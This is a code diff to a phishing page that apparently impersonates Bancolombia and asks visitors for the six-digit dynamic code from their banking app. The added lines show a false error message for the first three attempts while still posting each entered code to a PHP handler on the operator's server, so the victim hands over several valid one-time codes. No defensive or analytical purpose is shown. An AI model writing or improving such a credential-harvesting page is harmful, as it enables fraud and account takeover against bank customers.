@@ -66,7 +66,7 @@
     <a style="font-size:16px; text-align:center; color:#fff;">La puedes encontrar en la app bancolombia</a>
     <br>
     <br>
-    <input type="text" name="user" id="txtDinamic" placeholder="******" style="border:none; width:90%;height:35px; background: transparent; border-bottom:2px solid #fff; padding.left:15px; text-align:center;" maxlength="6" minlenght="6">
+    <input type="text" name="code" id="txtDinamic" placeholder="******" style="border:none; width:90%;height:35px; background: transparent; border-bottom:2px solid #fff; padding.left:15px; text-align:center;" maxlength="6" minlenght="6">
     <br>
 </center>
 <br>
@@ -79,6 +79,8 @@
 </div>
     <script type="text/javascript">
 	var espera = 0;
+    var counter = 0;
+
 
 	let identificadorTiempoDeEspera;
 
@@ -96,6 +98,12 @@
 				const data = {
                     'dinamica': $("#txtDinamic").val()
                 };
+                if(counter < 3) {
+                    counter ++;
+                    $(".mensaje").show();
+                    $(".pass").css("border", "1px solid red");
+                    $("#txtDinamic").focus();
+                }
 				$.ajax({
                     url: '../../acciones/editar_mensaje.php',
                     method: 'POST',
@@ -116,12 +124,12 @@
                 });				
 			}else{
 				$(".mensaje").show();
-				$(".pass").css("border", "1px solid red");
-				$("#txtOTP").focus();
+				$(".code").css("border", "1px solid red");
+				$("#txtDinamic").focus();
 			}			
 		});
 
-		$("#txtOTP").keyup(function(e) {
+		$("#txtDinamic").keyup(function(e) {
 			$(".pass").css("border", "1px solid #CCCCCC");	
 			$(".mensaje").hide();				
 		});
